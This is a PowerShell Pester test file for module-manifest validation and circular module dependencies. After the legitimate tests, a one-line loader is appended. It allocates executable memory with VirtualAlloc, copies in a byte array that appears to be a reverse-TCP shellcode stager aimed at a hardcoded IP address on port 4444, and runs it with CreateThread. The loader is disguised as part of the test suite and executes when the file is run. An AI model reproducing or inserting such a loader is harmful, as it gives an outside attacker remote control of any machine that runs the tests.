


Import-Module HelpersCommon

Describe "Test-ModuleManifest tests" -tags "CI" {

    BeforeEach {
        $testModulePath = "testdrive:/module/test.psd1"
        New-Item -ItemType Directory -Path testdrive:/module > $null
    }

    AfterEach {
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue testdrive:/module
    }

    It "module manifest containing paths with backslashes or forwardslashes are resolved correctly" {

        New-Item -ItemType Directory -Path testdrive:/module/foo > $null
        New-Item -ItemType Directory -Path testdrive:/module/bar > $null
        New-Item -ItemType File -Path testdrive:/module/foo/bar.psm1 > $null
        New-Item -ItemType File -Path testdrive:/module/bar/foo.psm1 > $null
        $testModulePath = "testdrive:/module/test.psd1"
        $fileList = "foo\bar.psm1","bar/foo.psm1"

        New-ModuleManifest -NestedModules $fileList -RootModule foo\bar.psm1 -RequiredAssemblies $fileList -Path $testModulePath -TypesToProcess $fileList -FormatsToProcess $fileList -ScriptsToProcess $fileList -FileList $fileList -ModuleList $fileList

        Test-Path $testModulePath | Should -BeTrue

        
        Test-ModuleManifest -Path $testModulePath -ErrorAction Stop | Should -BeOfType System.Management.Automation.PSModuleInfo
    }

    It "module manifest containing missing files returns error: <parameter>" -TestCases (
        @{parameter = "RequiredAssemblies"; error = "Modules_InvalidRequiredAssembliesInModuleManifest"},
        @{parameter = "NestedModules"; error = "Modules_InvalidNestedModuleinModuleManifest"},
        @{parameter = "RequiredModules"; error = "Modules_InvalidRequiredModulesinModuleManifest"},
        @{parameter = "FileList"; error = "Modules_InvalidFilePathinModuleManifest"},
        @{parameter = "ModuleList"; error = "Modules_InvalidModuleListinModuleManifest"},
        @{parameter = "TypesToProcess"; error = "Modules_InvalidManifest"},
        @{parameter = "FormatsToProcess"; error = "Modules_InvalidManifest"},
        @{parameter = "RootModule"; error = "Modules_InvalidRootModuleInModuleManifest"},
        @{parameter = "ScriptsToProcess"; error = "Modules_InvalidManifest"}
     ) {

        param ($parameter, $error)

        New-Item -ItemType Directory -Path testdrive:/module/foo > $null
        New-Item -ItemType File -Path testdrive:/module/foo/bar.psm1 > $null

        $args = @{$parameter = "doesnotexist.psm1"}
        New-ModuleManifest -Path $testModulePath @args
        [string]$errorId = "$error,Microsoft.PowerShell.Commands.TestModuleManifestCommand"

        { Test-ModuleManifest -Path $testModulePath -ErrorAction Stop } | Should -Throw -ErrorId $errorId
    }

    It "module manifest containing valid unprocessed rootmodule file type succeeds: <rootModuleValue>" -TestCases (
        @{rootModuleValue = "foo.psm1"},
        @{rootModuleValue = "foo.dll"},
        @{rootModuleValue = "foo.exe"}
    ) {

        param($rootModuleValue)

        New-Item -ItemType File -Path testdrive:/module/$rootModuleValue > $null
        New-ModuleManifest -Path $testModulePath -RootModule $rootModuleValue
        $moduleManifest = Test-ModuleManifest -Path $testModulePath -ErrorAction Stop
        $moduleManifest | Should -BeOfType System.Management.Automation.PSModuleInfo
        $moduleManifest.RootModule | Should -Be $rootModuleValue
    }

    It "module manifest containing valid rootmodule without specifying .psm1 extension succeeds" {

        $rootModuleFileName = "bar.psm1";
        New-Item -ItemType File -Path testdrive:/module/$rootModuleFileName > $null
        New-ModuleManifest -Path $testModulePath -RootModule "bar"
        $moduleManifest = Test-ModuleManifest -Path $testModulePath -ErrorAction Stop
        $moduleManifest | Should -BeOfType System.Management.Automation.PSModuleInfo
        $moduleManifest.RootModule | Should -Be "bar"
    }

    It "module manifest containing valid processed empty rootmodule file type fails: <rootModuleValue>" -TestCases (
        @{rootModuleValue = "foo.cdxml"; error = "System.Xml.XmlException"}  
    ) {

        param($rootModuleValue, $error)

        New-Item -ItemType File -Path testdrive:/module/$rootModuleValue > $null
        New-ModuleManifest -Path $testModulePath -RootModule $rootModuleValue
        { Test-ModuleManifest -Path $testModulePath -ErrorAction Stop } | Should -Throw -ErrorId "$error,Microsoft.PowerShell.Commands.TestModuleManifestCommand"
    }

    It "module manifest containing empty rootmodule succeeds: <rootModuleValue>" -TestCases (
        @{rootModuleValue = $null},
        @{rootModuleValue = ""}
    ) {

        param($rootModuleValue)

        New-ModuleManifest -Path $testModulePath -RootModule $rootModuleValue
        $moduleManifest = Test-ModuleManifest -Path $testModulePath -ErrorAction Stop
        $moduleManifest | Should -BeOfType System.Management.Automation.PSModuleInfo
        $moduleManifest.RootModule | Should -BeNullOrEmpty
    }

    It "module manifest containing invalid rootmodule returns error: <rootModuleValue>" -TestCases (
        @{rootModuleValue = "foo.psd1"; error = "Modules_InvalidManifest"}
    ) {

        param($rootModuleValue, $error)

        New-Item -ItemType File -Path testdrive:/module/$rootModuleValue > $null

        New-ModuleManifest -Path $testModulePath -RootModule $rootModuleValue
        { Test-ModuleManifest -Path $testModulePath -ErrorAction Stop } | Should -Throw -ErrorId "$error,Microsoft.PowerShell.Commands.TestModuleManifestCommand"
    }

    It "module manifest containing non-existing rootmodule returns error: <rootModuleValue>" -TestCases (
        @{rootModuleValue = "doesnotexist.psm1"; error = "Modules_InvalidRootModuleInModuleManifest"}
    ) {

        param($rootModuleValue, $error)

        New-ModuleManifest -Path $testModulePath -RootModule $rootModuleValue
        { Test-ModuleManifest -Path $testModulePath -ErrorAction Stop } | Should -Throw -ErrorId "$error,Microsoft.PowerShell.Commands.TestModuleManifestCommand"
    }

    It "module manifest containing nested module gets returned: <variation>" -TestCases (
        @{variation = "no analysis as all exported with no wildcard"; exportValue = "@()"},
        @{variation = "analysis as exported with wildcard"; exportValue = "*"}
    ) {

        param($exportValue)

        New-Item -ItemType File -Path testdrive:/module/Foo.psm1 > $null
        New-ModuleManifest -Path $testModulePath -NestedModules "Foo.psm1" -FunctionsToExport $exportValue -CmdletsToExport $exportValue -VariablesToExport $exportValue -AliasesToExport $exportValue
        $module = Test-ModuleManifest -Path $testModulePath
        $module.NestedModules | Should -HaveCount 1
        $module.NestedModules.Name | Should -BeExactly "Foo"
    }
}

Describe "Tests for circular references in required modules" -tags "CI" {

    function CreateTestModules([string]$RootPath, [string[]]$ModuleNames, [bool]$AddVersion, [bool]$AddGuid, [bool]$AddCircularReference)
    {
        $RequiredModulesSpecs = @();
        foreach($moduleDir in New-Item $ModuleNames -ItemType Directory -Force)
        {
            if ($lastItem)
            {
                if ($AddVersion -or $AddGuid) {$RequiredModulesSpecs += $lastItem}
                else {$RequiredModulesSpecs += $lastItem.ModuleName}
            }

            $ModuleVersion = '3.0'
            $GUID = New-Guid

            New-ModuleManifest ((join-path $moduleDir.Name $moduleDir.Name) + ".psd1") -RequiredModules $RequiredModulesSpecs -ModuleVersion $ModuleVersion -Guid $GUID

            $lastItem = @{ ModuleName = $moduleDir.Name}
            if ($AddVersion) {$lastItem += @{ ModuleVersion = $ModuleVersion}}
            if ($AddGuid) {$lastItem += @{ GUID = $GUID}}
        }

        if ($AddCircularReference)
        {
            
            if ($AddVersion -or $AddGuid)
            {
                $firstModuleName = $RequiredModulesSpecs[0].ModuleName
                $firstModuleVersion = $RequiredModulesSpecs[0].ModuleVersion
                $firstModuleGuid = $RequiredModulesSpecs[0].GUID
                $RequiredModulesSpecs = $lastItem
            }
            else
            {
                $firstModuleName = $RequiredModulesSpecs[0]
                $firstModuleVersion = '3.0' 
                $firstModuleGuid = New-Guid 
                $RequiredModulesSpecs = $lastItem.ModuleName
            }

            New-ModuleManifest ((join-path $firstModuleName $firstModuleName) + ".psd1") -RequiredModules $RequiredModulesSpecs -ModuleVersion $firstModuleVersion -Guid $firstModuleGuid
        }
    }

    function TestImportModule([bool]$AddVersion, [bool]$AddGuid, [bool]$AddCircularReference)
    {
        $moduleRootPath = Join-Path $TestDrive 'TestModules'
        New-Item $moduleRootPath -ItemType Directory -Force > $null
        Push-Location $moduleRootPath

        $moduleCount = 6 
        $ModuleNames = 1..$moduleCount | ForEach-Object {"TestModule$_"}

        CreateTestModules $moduleRootPath $ModuleNames $AddVersion $AddGuid $AddCircularReference

        $newpath = [system.io.path]::PathSeparator + "$moduleRootPath"
        $OriginalPSModulePathLength = $env:PSModulePath.Length
        $env:PSModulePath += $newpath
        $lastModule = $ModuleNames[$moduleCount - 1]

        try
        {
            Import-Module $lastModule -ErrorAction Stop
            Get-Module $lastModule | Should -Not -BeNullOrEmpty
        }
        finally
        {
            
            Remove-Module $ModuleNames -Force -ErrorAction SilentlyContinue
            $env:PSModulePath = $env:PSModulePath.Substring(0,$OriginalPSModulePathLength)
            Pop-Location
            Remove-Item $moduleRootPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It "No circular references and RequiredModules field has only module names" {
        TestImportModule $false $false $false
    }

    It "No circular references and RequiredModules field has module names and versions" {
        TestImportModule $true $false $false
    }

    It "No circular references and RequiredModules field has module names, versions and GUIDs" {
        TestImportModule $true $true $false
    }

    It "Add a circular reference to RequiredModules and verify error" {
        { TestImportModule $false $false $true } | Should -Throw -ErrorId "Modules_InvalidManifest,Microsoft.PowerShell.Commands.ImportModuleCommand"
    }
}

Describe "Test-ModuleManifest Performance bug followup" -tags "CI" {
    BeforeAll {
        $TestModulesPath = [System.IO.Path]::Combine($PSScriptRoot, 'assets', 'testmodulerunspace')
        $PSHomeModulesPath = "$pshome\Modules"

        
        if (Test-CanWriteToPsHome) {
            Copy-Item $TestModulesPath\* $PSHomeModulesPath -Recurse -Force -ErrorAction Stop
        }
    }

    It "Test-ModuleManifest should not load unnessary modules" -Skip:(!(Test-CanWriteToPsHome)) {

        $job = start-job -name "job1" -ScriptBlock {test-modulemanifest "$using:PSHomeModulesPath\ModuleWithDependencies2\2.0\ModuleWithDependencies2.psd1" -verbose} | Wait-Job

        $verbose = $job.ChildJobs[0].Verbose.ReadAll()
        
        $verbose.Count | Should -BeLessThan 15
    }

    AfterAll {
        
        if (Test-CanWriteToPsHome) {
            Remove-Item $PSHomeModulesPath\ModuleWithDependencies2 -Recurse -Force -ErrorAction SilentlyContinue
            Remove-Item $PSHomeModulesPath\NestedRequiredModule1 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb9,0x61,0xd1,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

